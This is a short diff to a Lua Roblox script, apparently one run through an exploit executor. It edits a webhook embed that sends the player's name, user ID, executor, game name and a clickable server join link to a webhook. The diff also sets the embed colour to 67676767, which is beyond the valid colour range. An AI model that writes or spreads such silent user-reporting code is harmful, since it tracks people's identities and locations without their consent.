@@ -77,12 +77,12 @@ local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknow
 local webhookBody = HttpService:JSONEncode({
     embeds = {{
         title = "flash zaml",
-        color = 7864319,
+        color = 67676767,
         fields = {
             { name = "User",      value = LP.Name .. " (`" .. LP.UserId .. "`)", inline = false },
             { name = "Executor",  value = executor,                               inline = false },
             { name = "Game Name", value = gameName,                               inline = false },
-            { name = "Join Link", value = joinLink,                               inline = false }
+            { name = "Join Server", value = "[Click to Join](" .. joinLink .. ")", inline = false }
         },
         footer = { text = "flash zaml" }
     }}
